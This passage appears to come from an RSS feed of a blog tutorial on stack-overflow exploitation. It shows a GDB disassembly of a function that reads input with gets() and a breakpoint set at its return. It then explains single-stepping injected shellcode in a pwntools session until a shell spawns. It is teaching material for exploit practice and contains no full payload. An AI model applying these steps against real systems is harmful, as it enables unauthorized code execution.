+0x08048441 &amp;lt;+1&amp;gt;: mov ebp,esp
+0x08048443 &amp;lt;+3&amp;gt;: sub esp,0x40
+0x08048446 &amp;lt;+6&amp;gt;: lea ebx,[ebp-0x40]
+0x08048449 &amp;lt;+9&amp;gt;: push ebx
+0x0804844a &amp;lt;+10&amp;gt;: push 0x804a020
+0x0804844f &amp;lt;+15&amp;gt;: call 0x8048300 &amp;lt;printf@plt&amp;gt;
+0x08048454 &amp;lt;+20&amp;gt;: push ebx
+0x08048455 &amp;lt;+21&amp;gt;: call 0x8048310 &amp;lt;gets@plt&amp;gt;
+0x0804845a &amp;lt;+26&amp;gt;: add esp,0x4
+0x0804845d &amp;lt;+29&amp;gt;: leave
+0x0804845e &amp;lt;+30&amp;gt;: ret
+0x0804845f &amp;lt;+31&amp;gt;: nop
+End of assembler dump.
+gdb-peda$ b *0x0804845e
+Breakpoint 1 at 0x804845e
+gdb-peda$ c
+Continuing.
+&lt;/code>&lt;/pre>&lt;p>The continue command will return control to the terminal in which we&amp;rsquo;re running the pwntools script. This is where the raw_input comes in handy, because it will wait for you to say “go” before proceeding further. Now if you hit &lt;code>&amp;lt;Enter&amp;gt;&lt;/code> at the Send payload? prompt, you will notice that GDB has reached the breakpoint you&amp;rsquo;ve previously set.&lt;/p>
+&lt;p>You can now single-step each instruction of the shellcode inside GDB to see that everything is working properly. Once you reach int &lt;code>0x80&lt;/code>, you can continue again (or close GDB altogether) and interact with the newly spawned shell in the pwntools session.&lt;/p></description></item></channel></rss>
